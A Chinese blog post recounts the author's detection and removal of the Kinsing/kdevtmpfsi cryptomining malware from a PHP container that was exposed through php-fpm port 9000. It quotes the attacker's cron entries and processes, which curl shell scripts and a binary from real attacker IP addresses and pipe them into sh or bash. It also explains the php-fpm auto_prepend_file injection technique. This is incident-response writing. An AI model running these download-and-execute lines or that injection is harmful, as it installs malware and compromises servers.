<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  
  <meta name="generator" content="Hugo 0.89.4" />

  
  <meta name="description" content="this is description">
  

  
  <link rel="apple-touch-icon" sizes="180x180" href="https://kouler.com/apple-touch-icon.png">

  
  <link rel="icon" type="image/png" sizes="32x32" href="https://kouler.com/favicon-32x32.png">

  
  <link rel="icon" type="image/png" sizes="16x16" href="https://kouler.com/favicon-16x16.png">

  
  <link rel="manifest" href="https://kouler.com/site.webmanifest">

  
  <link rel="mask-icon" href="https://kouler.com/safari-pinned-tab.svg" color="#5bbad5">

  <meta name="msapplication-TileColor" content="#da532c">

  <meta name="theme-color" content="#ffffff">

  
  <link rel="stylesheet" href="https://kouler.com/css/bootstrap.min.css" />

  
  <title>解决 kinsing 挖矿恶意程序的攻击 | Kouler</title>
  

  <style>
body {
  min-width: 300px;
}

.custom-navbar {
  margin-bottom: 1em;
  height: 60px;
}

.custom-navbar a {
  display: inline-block; 
  padding: 18px 0;
  margin-right: 1em; 
  font-weight: bold; 
}

.custom-navbar a:hover,
.custom-navbar a:focus {
  text-decoration: none; 
}

@media print {
  .custom-navbar {
    display: none;
  }
}

article {
  padding-bottom: 1em;
}

img {
  max-width: 100%;
}


body {
  background-color: #fff;
}



body {
  color: #212529;
}



a {
  color: #336699;
}



a:hover,
a:focus {
  color: #336699;
}



.custom-navbar {
  background-color: #ffffff;
}



.custom-navbar a {
  color: rgba(0, 0, 0, 0.75);
}



.custom-navbar a:hover,
.custom-navbar a:focus {
  color: rgba(0, 0, 0, 1);
}



.container {
  max-width: 1024px;
}



pre {
  display: block;
  padding: 9.5px;
  word-break: break-all;
  word-wrap: break-word;
  background-color: #f5f5f5;
  border: 1px solid #ccc;
  border-radius: 4px;
}

pre code {
  padding: 0;
  font-size: inherit;
  color: inherit; 
  white-space: pre-wrap;
  background-color: transparent;
  border: none;
  border-radius: 0;
}

code {
  padding: 0 0 0 3px;
  font-size: .9em;
}

code a,
code a:hover {
  color: #999999;
}



blockquote,
.blockquote {
  padding: 10px 20px;
  margin: 0 0 20px;
  font-size: 1em;
  border-left: 5px solid #6c757d;
}

</style>
</head>

<body>
  <nav class="custom-navbar">
  <div class="container">
    
    <a href="/">Posts</a>
    
    <a href="/tags/">Tags</a>
    
  </div>
</nav>
  
  <div class="container">
    <article>
      <h1 style="margin:0 0 5px 0">解决 kinsing 挖矿恶意程序的攻击</h1>
    
    
    <small class="text-secondary">2021-08-27</small>
    

<small><code><a href="https://kouler.com/tags/kinsing">#kinsing</a></code></small>


<small><code><a href="https://kouler.com/tags/kdevtmpfsi">#kdevtmpfsi</a></code></small>


<small><code><a href="https://kouler.com/tags/%E6%8C%96%E7%9F%BF">#挖矿</a></code></small>


<small><code><a href="https://kouler.com/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F">#恶意程序</a></code></small>


<small><code><a href="https://kouler.com/tags/%E6%BC%8F%E6%B4%9E">#漏洞</a></code></small>


<small><code><a href="https://kouler.com/tags/php">#php</a></code></small>

    <br><br>
<h2 id="环境">环境</h2>
<ul>
<li>基于 php7.4.12 的容器</li>
<li>使用 Lumen 框架</li>
</ul>
<h2 id="发现异常状况">发现异常状况</h2>
<p>最开始察觉到异常是在错误邮件中</p>
<p>错误信息是 <code>Cannot modify header information - headers already sent by (output started at php://input:1)</code></p>
<p>几天后，发现页面中出现大量跨域错误</p>
<p>查看 git 提交日志，发现最近并没有大的变动，怀疑是运维问题</p>
<p>再次检查邮箱，发现最近几日有大量 <code>Cannot modify header information - headers already sent by (output started at php://input:1)</code> 错误，错误文件指向了跨域处理文件，错误函数为 <code>header()</code>。与错误信息吻合，应该是在这之前有输出，此时可以确认导致错误的根本原因并非跨域问题。</p>
<p>通过测试 API，发现其中一些 POST API 在正确的响应内容前会先将 POST 请求中的请求体输出。而 GET 参数则一切正常。</p>
<h2 id="寻找问题根源">寻找问题根源</h2>
<p>多次测试 API 后发现一些规律。</p>
<ol>
<li>使用 x-www-form-urlencoded 和 json 方式时，PHP 直接返回了 POST 请求 body 信息。而使用 multipart/form-data 方式时却没有返回</li>
<li>GET 方法中，如果有 x-www-form-urlencoded 和 json body 时，会出现一样的错误</li>
<li>不通过 Lumen 框架，直接请求 php 文件，如果请求中有 x-www-form-urlencoded 和 json body 信息时，同样会出现错误</li>
</ol>
<p>这里基本可以确认和框架没有关系。而且引出了 <code>php://input</code> 数据流。</p>
<p>POST 方法中的 x-www-form-urlencoded 和 raw 格式 Body 体会写入到 <code>php://input</code> 流中，与之前发现的规律相吻合。</p>
<h2 id="发现挖矿恶意程序">发现挖矿恶意程序</h2>
<p>在查找 php:input 数据流问题时，偶然发现容器中运行着两个异常进程，名称分别是 <code>kinsing</code> 和 <code>kdevtmpfsi</code></p>
<pre tabindex="0"><code>root@b3f806f09ccd:~# ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
root     10085  0.0  0.0   7632  1344 ?        R+   19:54   0:00 ps -aux
www-data 15438  0.0  0.1 718988 16148 ?        Sl   Aug04   0:40 /tmp/kinsing
www-data 15605  199 29.3 2930476 2397156 ?     Ssl  Aug04 11245:50 /tmp/kdevtmpfsi
</code></pre><p>这两个进程从 8 月 4 日晚启动，与第一次错误日志出现的时间有关联。</p>
<p>搜索后得知，这两个程序是挖矿恶意程序。使用 <code>kill -9</code> 强制杀掉后，再次测试 API，能够正常返回数据。</p>
<p>至此可以确认一切的根源就是该挖矿恶意程序导致的。</p>
<h2 id="无法完全禁止挖矿恶意程序启动">无法完全禁止挖矿恶意程序启动</h2>
<p>使用 <code>kill -9</code> 命令强制杀死挖矿进程后，发现其会在几分钟内自行重启</p>
<p>查看 supervisor 服务，发现没有类似的配置。再查看 <code>cron</code> 服务，发现了异常计划任务。 <code>* * * * * curl http://195.3.146.118/unk.sh | sh &gt; /dev/null 2&gt;&amp;1</code></p>
<p>删除该计划任务，几分钟后又出现了类似的计划任务。 <code>* * * * * curl http://195.3.146.118/ph.sh | bash &gt; /dev/null 2&gt;&amp;1</code></p>
<p>再一次删除计划任务，修改了恶意程序名称后，发现恶意程序被重新下载执行</p>
<p>下载过程中的进程列表如下：</p>
<pre tabindex="0"><code>root@b3f806f09ccd# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
root        11  0.0  0.0   5504   880 ?        Ss   Jan29   1:18 /usr/sbin/cron
root     10749  0.0  0.1  80588 14492 ?        S    20:17   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
www-data 10750  0.0  0.1  86932 15836 ?        S    20:17   0:00 php-fpm: pool www
www-data 10751  0.0  0.2  88984 17796 ?        S    20:17   0:00 php-fpm: pool www
www-data 11671  0.0  0.0   2380   652 ?        S    20:57   0:00 sh -c [ -f &quot;/bin/bash&quot; ] &amp;&amp; (curl -s http://194.38.20.199/ph.sh||wget -q -
www-data 11673  0.0  0.0   3992  1880 ?        S    20:57   0:00 bash
www-data 11765  0.1  0.0  23096  4832 ?        S    20:57   0:00 curl -o /tmp/kinsing http://194.38.20.199/kinsing
root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
</code></pre><p>通过进程列表可以得到 <code>curl</code> 命令执行的完整进程树</p>
<pre tabindex="0"><code>- [0]
  - [10749] php-fpm: master
    - [10750] php-fpm: pool
      - [11671] sh
        - [11673] bash
          - [11765] curl
</code></pre><p>通过进程树发现恶意程序是通过 <code>php-fpm</code> 进程执行了 <code>curl</code> 命令</p>
<h2 id="临时恢复服务">临时恢复服务</h2>
<p>搜索后发现网络上大部分是通过 redis 被注入的恶意代码。</p>
<p>我们的容器没有装 redis，很可能是通过 php-fpm 被注入的，类似于 <a href="https://learnku.com/articles/52350">关于 linux 病毒 kinsing-kdevtmpfsi 的处理</a> 这篇文章所描述的</p>
<p>所以最终决定借着此次事件，升级到更安全的 PHP 版本，并重新制作镜像。</p>
<p>由于重新制作镜像需要一点时间，所以需要临时恢复服务。</p>
<p>最先尝试了以下方法，试图使用同名的程序替代真正的挖矿程序</p>
<ol>
<li>通过 <code>kill -9 [PID]</code> 删除恶意进程 <code>kinsing</code> 和 <code>kdevtmpfsi</code></li>
<li><code>find / -iname kinsing* -exec rm -fv {} \;</code> 删除恶意文件</li>
<li><code>find / -iname kdevtmpfsi* -exec rm -fv {} \;</code></li>
<li><code>crontab -u www-data -e</code> 打开 cron 配置文件并手动删除恶意计划任务</li>
<li><code>touch /tmp/kdevtmpfsi &amp;&amp; touch /tmp/kinsing</code> 创建空的同名文件，防止恶意再次创建程序</li>
<li><code>echo &quot;kdevtmpfsi is fine now&quot; &gt; /tmp/kdevtmpfsi</code></li>
<li><code>echo &quot;kinsing is fine now&quot; &gt; /tmp/kinsing</code></li>
<li><code>chmod 0444 /tmp/kdevtmpfsi</code> 设置为只读权限</li>
<li><code>chmod 0444 /tmp/kinsing</code></li>
</ol>
<p>这种方法在 <a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu">kdevtmpfsi-using-the-entire-cpu</a> 这个页面中被提到，可能针对之前的版本是有效的。但现在已经无法骗过挖矿程序。该恶意程序会修改程序名称然后重新下载并启动。</p>
<pre tabindex="0"><code>root     11413  0.0  0.0   3992  2104 ?        Ss   Aug08   0:00 /bin/bash
www-data 17650  0.0  0.3 718732 29360 ?        Sl   02:30   0:00 /tmp/kinsing_aw7Y9KYM
www-data 17817  200 29.3 2737844 2398144 ?     Ssl  02:31  90:35 /tmp/kdevtmpfsi593659172
root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
</code></pre><p>不得已使用了另一种更直接的方式，每 20s 强制停止恶意程序。具体方法可以参考这篇文章 <a href="https://www.createit.com/blog/kinsing-malware-how-to-kill/">Kinsing malware (kdevtmpfsi)- how to kill</a></p>
<h2 id="php-fpm-的漏洞逻辑">php-fpm 的漏洞逻辑</h2>
<ul>
<li>php-fpm 用于解析 fastcgi 协议，决定了 php 将执行哪个文件</li>
<li>当 php-fpm 端口暴露在外，就可以自己构建 fastcig 协议内容</li>
<li>而且通过 php-fpm 中的 <code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code> 环境变量，可以修改 PHP 的配置项</li>
<li>而在 PHP 配置项中，有这样两个配置项
<ul>
<li><code>auto_prepend_file</code> 告诉 PHP 在目标文件执行前，先包含该配置项中指定的文件</li>
<li><code>auto_append_file</code> 告诉 PHP 在目标文件执行后，包含该配置项中指定的文件</li>
</ul>
</li>
<li><code>php://input</code> 包含 HTTP 中请求的 body 数据流信息（不包括 multipart/form-data 数据）</li>
<li>如果将 <code>auto_prepend_file</code> 设置为 <code>php://input</code>，那么在执行任何 php 文件前都会包含 <code>php://input</code> 中的 HTTP body 内容</li>
<li>而后将待执行的代码放在 body 中，就能够被执行</li>
</ul>
<blockquote>
<p>fpm 一般会启动多个进程，你如果用了 ADMIN_VALUE，你访问的这个进程的配置项就改变了，但不影响其他进程。如果你多访问几次，就可能把所有进程的配置项都改了，而且是永久改的。直到下次重启 fpm。</p>
</blockquote>
<p>详细内容可以参考这篇文章 <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写</a></p>
<h2 id="问题解决">问题解决</h2>
<p>此次被攻击是由于疏忽导致，对外网暴露了 php-fpm 使用的 9000 端口。</p>
<p>外网禁用 9000 端口并重新构建镜像部署服务后，问题得以解决。</p>
<h2 id="了解-kinsing-恶意程序">了解 Kinsing 恶意程序</h2>
<blockquote>
<p>Kinsing is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment.</p>
</blockquote>
<ul>
<li><a href="https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/">Zoom into Kinsing</a></li>
<li><a href="https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability">Kinsing Malware Attacks Targeting Container Environments</a></li>
<li><a href="https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces">Kinsing: The Malware with Two Faces</a></li>
</ul>
<h2 id="参考--扩展">参考 &amp; 扩展</h2>
<ul>
<li><a href="https://learnku.com/articles/52350">关于 linux 病毒 kinsing-kdevtmpfsi 的处理</a></li>
<li><a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu">kdevtmpfsi-using-the-entire-cpu</a></li>
<li><a href="https://www.createit.com/blog/kinsing-malware-how-to-kill/">Kinsing malware (kdevtmpfsi)- how to kill</a></li>
<li><a href="https://itmeida.com/myblog/JSPACE/2020-lockdown-9/">干掉服务器上的‘kdevtmpfsi’和‘kinsing‘挖矿病毒</a></li>
<li><a href="https://developer.huawei.com/consumer/cn/forum/topic/0202490219246760154">记一次被注入挖矿程序 kdevtmpfi 解决记录</a></li>
<li><a href="https://learnku.com/articles/52350">关于 linux 病毒 kinsing-kdevtmpfsi 的处理</a></li>
<li><a href="https://www.createit.com/blog/kinsing-malware-how-to-kill/">Kinsing malware (kdevtmpfsi)- how to kill</a></li>
<li><a href="https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/">Zoom into Kinsing</a></li>
<li><a href="https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability">Kinsing Malware Attacks Targeting Container Environments</a></li>
<li><a href="https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces">Kinsing: The Malware with Two Faces</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写</a></li>
</ul>

    </article>
  </div>

  
  
  
  <script>
  window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
  ga('create', 'UA-123456789-1', 'auto');
  ga('send', 'pageview');
  </script>
  <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  
</body>

</html>
